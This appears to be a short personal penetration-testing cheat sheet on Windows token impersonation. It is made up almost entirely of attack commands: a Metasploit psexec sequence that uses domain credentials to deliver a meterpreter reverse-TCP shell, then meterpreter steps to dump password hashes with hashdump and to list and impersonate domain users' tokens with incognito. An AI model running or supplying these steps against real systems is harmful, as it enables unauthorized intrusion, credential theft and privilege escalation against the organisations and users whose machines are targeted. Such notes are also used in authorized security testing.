**token impersonation using msf psexec module**
NOTE: noisy attack
IMPERSONATING IMPERSONATE TOKEN

<h4>msf</h4>
```
use exploit/windows/smb/psexec
set rhost <target ip>
set smbdomain <target domain>
set smbpass <password>
set smbuser <username>
set payload windows/x64/meterpreter/reverse_tcp
set lhost <network interface>
set target 2 (native upload)
run
```

<h4>meterpreter</h4>
hashdump (optional) - dump hashes
getuid - confirm usere/pwd
sysinfo - system info

<h4>impersonation</h4>
load incognito
list_token -u / -g (groups)
impersonate_token <domain\\user>

![[Pasted image 20250402230236.png]]

NOTE: if access denied
rev2self